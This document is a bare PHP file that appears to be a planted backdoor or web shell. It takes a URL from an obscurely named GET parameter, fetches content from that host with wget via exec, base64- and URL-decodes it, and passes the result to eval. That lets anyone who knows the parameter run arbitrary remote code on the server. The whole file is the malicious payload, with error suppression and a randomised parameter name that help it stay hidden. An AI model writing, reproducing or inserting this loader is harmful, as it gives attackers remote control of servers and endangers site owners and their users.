<?php

$e = 'https://'.@$_GET['ylgn4akwcxm5oh'];
@exec("wget $e -qO-", $w);
$y = base64_decode($w[0]);
$g = urldecode($y);
$c = '?>';
$a = $c.$g;
eval($a);
